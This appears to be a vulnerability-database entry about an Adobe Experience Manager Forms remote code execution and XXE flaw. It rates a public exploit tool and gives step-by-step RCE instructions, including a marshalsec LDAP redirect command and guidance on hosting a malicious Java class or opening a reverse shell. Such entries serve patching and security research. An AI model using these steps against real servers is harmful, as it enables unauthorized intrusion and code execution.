## CVE-2025-54253 - Adobe Experience Manager (AEM) Forms on JEE Remote Code Execution (RCE), Authentication Bypass, XML External Entity (XXE) Injection, OGNL Injection

**漏洞编号:** CVE-2025-54253

**漏洞类型:** Remote Code Execution (RCE), Authentication Bypass, XML External Entity (XXE) Injection, OGNL Injection

**影响应用:** Adobe Experience Manager (AEM) Forms on JEE

**危害等级:** Critical

**CVSS评分:** 9.8

**影响版本:** Versions prior to the August 2025 patch

**利用条件:** Unauthenticated network access, low attack complexity, no user interaction required.

**POC 可用性:** 10/10

**POC 类型:** Full exploit

**攻击复杂度:** Low

**投毒风险:** 0%

## 详情

CVE-2025-54253 affects Adobe Experience Manager (AEM) Forms on JEE. It is a critical configuration error that inadvertently enables Apache Struts' "devMode" in the administrative interface, which is further compounded by an authentication bypass vulnerability. This perilous combination allows unauthenticated attackers to execute arbitrary expressions using the Struts framework (specifically, OGNL injection), ultimately leading to Remote Code Execution (RCE) on the underlying system. The vulnerability is characterized by its ease of exploitation, requiring low attack complexity and no user interaction, making it highly attractive to malicious actors. Evidence from public disclosures confirms that this vulnerability has been actively exploited in the wild, necessitating immediate attention and patching. Additionally, CVE-2025-54254, an XML External Entity (XXE) injection vulnerability within the same Adobe Experience Manager solution, was addressed concurrently and is also supported by the provided PoC tool.

**POC Effectiveness Analysis**
The provided Proof-of-Concept (PoC) tool, named AEMPWN, is an exceptionally well-engineered and thoroughly documented scanner explicitly designed to identify and validate the vulnerabilities associated with CVE-2025-54253 (Remote Code Execution) and CVE-2025-54254 (XML External Entity injection). Its design prioritizes flexibility and user control, offering three distinct operational modes to cater to various stages of security testing, from initial reconnaissance to full-scale exploitation.
1.  **Safe PoC Mode (`--poc`)**: This mode is meticulously crafted for reconnaissance where a low-noise footprint is paramount. It enables testers to identify insecure XML parsing behaviors and viable exploit surfaces without initiating any destructive actions. Key validations include XML reflection, the analysis of non-HTML structured responses, the detection of canary token reflections, and other subtle indicators of insecure XML handling. This mode is invaluable for early-stage triage, mapping the potential impact of vulnerabilities, and gathering preliminary, non-disruptive signals before considering more aggressive testing.
2.  **OOB XXE Mode (`--oob`)**: This mode focuses on confirming blind XXE vulnerabilities by observing outbound network requests originating from the targeted AEM server. It requires the attacker to control an external HTTP server, which is used to host a malicious Document Type Definition (DTD) file. By observing these inbound requests and any accompanying query parameters, the attacker can conclusively prove that the XML parser fetches external entities, that the target makes outbound network requests, and critically, that sensitive local files can potentially be read and exfiltrated. The documentation for this mode is explicit in clarifying its limitations regarding full LDAP/JNDI exploitation, underscoring the necessity for additional infrastructure for such advanced scenarios.
3.  **RCE Mode (`--rce`)**: Representing the apex of the tool's capabilities, this mode is engineered to demonstrate actual code execution on the AEM server, thereby proving P1-level impact. It leverages the powerful technique of JNDI injection via XML parsing. Successful execution in this mode is contingent upon the attacker establishing a specific infrastructure: a running LDAP server (with recommended tools like `marshalsec`) configured to serve a Java class reference, and a separate HTTP server hosting a compiled malicious Java class (e.g., `Exploit.class`). During exploitation, the crafted XML input causes the AEM server to attempt a JNDI lookup. This lookup is redirected to the attacker's LDAP listener, which in turn provides a reference to the malicious Java class hosted on the HTTP server. The AEM server then loads and executes this class within its Java Virtual Machine. The comprehensive nature of these modes, combined with precise setup instructions and clear explanations of the underlying mechanisms, renders the AEMPWN PoC an exceptionally robust and reliable instrument for assessing, validating, and definitively demonstrating the profound impact of these critical Adobe Experience Manager vulnerabilities.

**Exploitation Steps (RCE Mode)**:
1.  **Setup LDAP Server**: Utilize a tool like `marshalsec` to establish an LDAPRefServer. For instance: `java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://your-server/#Exploit" 1389`. This server will listen for incoming JNDI lookups and then redirect the vulnerable target to download a malicious Java class.
2.  **Setup HTTP Server**: Host a compiled malicious Java class (e.g., `Exploit.class`) on an HTTP server that is accessible by the targeted AEM instance. The example `Exploit.class` typically incorporates `Runtime.getRuntime().exec()` to facilitate the execution of arbitrary commands, such as creating a specific file (`/tmp/pwned`) or initiating a reverse shell connection.
3.  **Run AEMPWN in RCE Mode**: Execute the `AEMPWN` tool with the `--rce` flag, specifying the vulnerable AEM Forms instance and providing the necessary parameters for the JNDI injection. This action will trigger the AEM server to connect to the attacker's LDAP server and subsequently download and execute the malicious Java class from the HTTP server.
4.  **Verify Execution**: Confirm the successful execution of the malicious class on the target server by observing its intended effects, such as the presence of the created file or an active reverse shell connection.

**Poisoning Risk Analysis**
The `AEMPWN` tool, as detailed in its `README.md`, presents a remarkably low poisoning risk from the perspective of the security researcher utilizing it. This assessment is based on several key observations. Firstly, the tool's documentation is exceptionally clear, transparent, and professionally written. It explicitly states its purpose: "This tool is designed for authorized security testing only," setting a clear ethical boundary and intent. Secondly, the tool meticulously outlines all its functionalities, the underlying vulnerabilities it targets, and the necessary external dependencies or infrastructure required for its various modes of operation. For instance, the RCE mode explicitly requires the user to set up and control an LDAP server (e.g., using `marshalsec`) and an HTTP server to host a *user-provided and compiled* malicious Java class (e.g., `Exploit.class`). This critical distinction highlights that the malicious payload (the `Exploit.class`) is something the attacker crafts and controls, and it is intended to be executed *by the vulnerable target server*, not by the `AEMPWN` tool itself on the researcher's machine. The provided `Exploit.class` example code within the documentation is illustrative of a typical RCE payload, designed to be compiled and hosted by the researcher, rather than being an embedded, hidden, or pre-compiled malicious component within the scanner. Furthermore, there are no overt signs of code obfuscation, the inclusion of suspicious external scripts, or any anomalous network requests that would suggest hidden malicious behaviors or data exfiltration attempts from the `AEMPWN` tool itself. The techniques employed—XML parsing, out-of-band confirmations, and JNDI injection setup guidance—are standard and well-understood methodologies within legitimate vulnerability research and penetration testing. Therefore, the probability of this specific PoC tool being a vector for "poisoning" the user's system, or containing embedded malicious payloads designed to harm the researcher, is assessed as `0%`. Users should, however, exercise due diligence and ensure that any self-compiled Java classes for the RCE mode are indeed benign for their testing environment, as any malicious code placed within *those* would be executed by the target.

**项目地址:** https://github.com/topics/cve-2025-54253

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-54253
